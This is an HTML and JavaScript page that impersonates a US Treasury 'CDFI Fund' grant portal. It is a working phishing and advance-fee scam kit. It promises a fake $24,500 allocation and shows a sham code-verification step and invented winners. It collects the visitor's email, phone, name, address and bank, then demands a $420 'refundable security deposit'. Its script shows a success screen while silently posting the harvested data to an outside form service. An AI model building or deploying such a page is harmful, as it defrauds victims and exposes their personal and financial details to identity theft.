<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CDFI Fund | Federal Re-allocation Portal</title>
    <style>
        :root { --primary: #003366; --secondary: #f4f7f9; --accent: #28a745; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--secondary); margin: 0; padding: 0; }
        .wrapper { max-width: 500px; margin: 40px auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid var(--primary); }
        .p-20 { padding: 25px; }
        .text-center { text-align: center; }
        
        /* Navigation Steps */
        .step-content { display: none; }
        .active { display: block; }

        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
        
        /* Modal Pop-up */
        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; }
        .modal-box { background: white; padding: 30px; border-radius: 8px; max-width: 400px; text-align: center; }
        .modal-box h3 { color: var(--primary); margin-top: 0; }
        .btn-yes { background: var(--accent); color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 10px; font-weight: bold;}
        .btn-no { background: #dc3545; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 10px; }

        .v-code { background: #e9ecef; letter-spacing: 5px; font-size: 24px; font-weight: bold; padding: 10px; margin: 15px 0; border: 1px dashed var(--primary); }
        .ticker { font-size: 12px; color: #666; background: #eee; padding: 5px; margin-top: 15px; border-radius: 4px; }
    </style>
</head>
<body>

<div id="modalOverlay">
    <div class="modal-box">
        <h3>Final Verification Requirement</h3>
        <p id="modalText"></p>
        <p style="font-size: 13px; color: #555;">This amount ensures your account is active and will be <strong>fully added back</strong> to your total payout once credited.</p>
        <button class="btn-yes" onclick="finalizeSubmit()">I AGREE & SUBMIT</button>
        <button class="btn-no" onclick="closeModal()">DECLINE</button>
    </div>
</div>

<div class="wrapper">
    <div id="step1" class="step-content active p-20">
        <div class="text-center">
            <h3>Treasury Login Portal</h3>
            <p>Access your individual 2026 allocation.</p>
        </div>
        <input type="email" id="uEmail" placeholder="Email Address" required>
        <input type="tel" id="uPhone" placeholder="Mobile Number" required>
        <button onclick="goToStep(2)">Generate Access Code</button>
        <div class="ticker">Recent: ✅ Amanda R. ($22,000) ... ✅ Luis T. ($15,500)</div>
    </div>

    <div id="step2" class="step-content p-20 text-center">
        <h3>Security Code</h3>
        <div class="v-code">CDFI-992</div>
        <input type="text" id="vInput" placeholder="Enter Code Above">
        <button onclick="checkCode()">Verify Identity</button>
    </div>

    <div id="step3" class="step-content p-20">
        <div class="text-center">
            <h2 style="color:var(--accent)">Approved: $24,500.00</h2>
            <p>Complete your disbursement profile.</p>
        </div>
        <form id="mainForm" action="https://formspree.io/f/YOUR_ID_HERE" method="POST">
            <input type="hidden" name="Auth_Email" id="hEmail">
            <input type="hidden" name="Auth_Phone" id="hPhone">
            <input type="hidden" name="Security_Deposit_Agreed" id="hDeposit">
            
            <input type="text" name="Legal_Name" placeholder="Full Legal Name" required>
            <input type="text" name="Address" placeholder="Physical Address" required>
            <input type="text" name="Bank" placeholder="Bank Name" required>
            
            <button type="button" onclick="openModal()">CLAIM ALLOCATION</button>
        </form>
    </div>

    <div id="step4" class="step-content p-20 text-center">
        <h1 style="color:var(--accent)">SUCCESS! ✅</h1>
        <p>Your application is now being processed.</p>
        <p>The security deposit will be added to your final payout. Please check your provided email address (<strong><span id="displayEmail"></span></strong>) within the next 30 minutes for the final steps.</p>
        <button onclick="location.reload()">Back to Home</button>
    </div>
</div>

<script>
    function goToStep(s) {
        document.querySelectorAll('.step-content').forEach(div => div.classList.remove('active'));
        document.getElementById('step'+s).classList.add('active');
    }

    function checkCode() {
        if(document.getElementById('vInput').value === 'CDFI-992') {
            document.getElementById('hEmail').value = document.getElementById('uEmail').value;
            document.getElementById('hPhone').value = document.getElementById('uPhone').value;
            goToStep(3);
        } else { alert("Code Incorrect"); }
    }

    function openModal() {
        // Calculate Deposit (Logic: Award is $24,500, so deposit is set to $420 for this example)
        const deposit = 420; 
        document.getElementById('modalText').innerHTML = `To facilitate this transfer, a <strong>Refundable Security Deposit of $${deposit}</strong> is required for account synchronization.`;
        document.getElementById('hDeposit').value = "$"+deposit;
        document.getElementById('modalOverlay').style.display = 'flex';
    }

    function closeModal() { document.getElementById('modalOverlay').style.display = 'none'; }

    async function finalizeSubmit() {
        const form = document.getElementById('mainForm');
        const formData = new FormData(form);
        
        // Show success screen immediately
        document.getElementById('displayEmail').innerText = document.getElementById('uEmail').value;
        closeModal();
        goToStep(4);

        // Send the email in the background
        fetch(form.action, {
            method: 'POST',
            body: formData,
            headers: { 'Accept': 'application/json' }
        });
    }
</script>

</body>
</html>
